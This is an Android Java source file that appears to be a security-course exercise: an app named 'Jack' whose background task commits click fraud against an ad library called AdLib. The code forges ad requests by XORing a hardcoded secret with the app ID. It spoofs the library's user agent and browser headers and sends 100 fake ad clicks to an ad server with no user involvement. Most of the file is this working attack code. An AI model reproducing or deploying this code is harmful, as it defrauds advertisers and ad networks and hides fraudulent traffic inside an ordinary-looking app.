package edu.stanford.cs.jack;

import java.io.InputStreamReader;
import java.io.Reader;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Set;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import cs.stanford.edu.jack.R;
import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.Menu;
import android.widget.LinearLayout;
import edu.stanford.cs.adlib.AdLibView;
import edu.stanford.cs.adlib.AdlibRequest;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        String appId = "199e324841adf60aa61187aff4bddbe4";
        
        AdLibView adView = new AdLibView(this, appId);
        
        LinearLayout layout = (LinearLayout)findViewById(R.id.adView);
        layout.addView(adView);
        AdlibRequest adRequest = new AdlibRequest();
        adRequest.addKeyword("java");
		adView.loadAd(adRequest);
		
		new ClickJack(appId).execute();
		
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }


    /* This is basically the same as the AdlibRequestClass except for the fact 
     * I hardcode the real SECRET here in order to produce the right app_id
     * value in the URLs. Also I changes toHttpGet to return an HttpGet object.
     */
	private class AdlibForgedRequest {

		private static final String SECRET = "4a95bad6eaa54d860c106fd1bd4db8ff";
		public final Set<String> keywords = new HashSet<String>();
		
		public void addKeyword(String keyword) {
			keywords.add(keyword);
		}

		protected HttpGet toHttpGet(String baseUrl, String appId) {
			
			HttpGet request = new HttpGet(baseUrl + "?keywords=" +
											this.keywordsToParamString() +
											"&app_id=" +
											xorHexAppId(SECRET, appId));
			return request;
		}
		
		private String keywordsToParamString() {
			if (keywords.isEmpty()) {
				return "";
			}
			
			Iterator<String> itr = keywords.iterator();
			StringBuilder builder = new StringBuilder(itr.next());
			while (itr.hasNext()) {
				String keyword = itr.next();
				builder.append(',');
				builder.append(keyword);
			}
			return builder.toString();
		}
		
		private String xorHexAppId(String secret, String appId) {
			String result = "";
			for (int i = 0; i < secret.length() && i < appId.length(); i+=2) {
				int appIdHex = Integer.parseInt(appId.substring(i, i + 2), 16);
				int secretHex = Integer.parseInt(secret.substring(i, i + 2), 16);
				int res = appIdHex ^ secretHex;
				result += String.format("%02x", res);
			}
			return new String(result);
		}
		
	}

	/* This class is an Asynchronous Background task that does the Click Fraud.
	 * It is basically started by the onCreate method of Jack's MainActivity
	 * and it sends 100 click requests to the server without requiring any
	 * user interaction.
     */
	private class ClickJack extends AsyncTask<Void, Void, Integer> {

		private String appId;
		private static final int NUM_CLICKS = 100;
		private static final String BASE_TOKEN_URL = "http://adlib.mappend.net/token";
		private static final String BASE_URL = "http://adlib.mappend.net";

		public ClickJack(String appId) {
			this.appId = appId;
		}
		
		@Override
		protected Integer doInBackground(Void... requests) {
			try {
				/* Create only once the GET request for an ad */
				AdlibForgedRequest adRequest = new AdlibForgedRequest();
        		adRequest.addKeyword("java");
				HttpGet request = adRequest.toHttpGet(BASE_TOKEN_URL, appId);
				request.setHeader("User-Agent", "adlib-android"); // server must think this came from the adlib-android user agent
				
				/* Now for NUM_CLICKS iterations execute the previous get 
				 * request to get an ad link, parse it and execute another
				 * HTTP GET request to simulate the click
				 */ 
				for (int clicks = 0; clicks < NUM_CLICKS; clicks++){
					/* Get the ad link from the server */
					HttpClient httpClient = new DefaultHttpClient();  
			    	HttpResponse response = httpClient.execute(request);

			    	/* Parse out the URL for the link */
			    	Reader reader = new InputStreamReader(response.getEntity().getContent());
					char buf[] = new char[40096];
					StringBuilder builder = new StringBuilder();
					while (reader.read(buf) > 0) {
						builder.append(buf);
					}
					String responseStr = builder.toString();
					String[] arr = responseStr.split("\"");
					String click_url = arr[1];

					/* Create a GET request for the parsed URL */
					HttpGet click_request = new HttpGet(BASE_URL + click_url);
					/* Add headers to simulate this came from the browser, o/w server will reject it */
					click_request.setHeader("User-Agent", "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; google_sdk Build/JB_MR1.1) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30");
					click_request.setHeader("X-Requested-With", "com.android.browser");
					click_request.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
					click_request.setHeader("Accept-Encoding", "gzip,deflate");
					click_request.setHeader("Accept-Language", "en-US");
					click_request.setHeader("Accept-Charset", "utf-8, iso-8859-1, utf-16, *;q=0.7");
					
					/* Execute the GET request to hijack a click */
					HttpClient httpClient2 = new DefaultHttpClient();  
			    	httpClient2.execute(click_request);
				}
				return 0;
			}
			catch (Exception e) {
				return -1;
			}
		}
		
	}
    
}
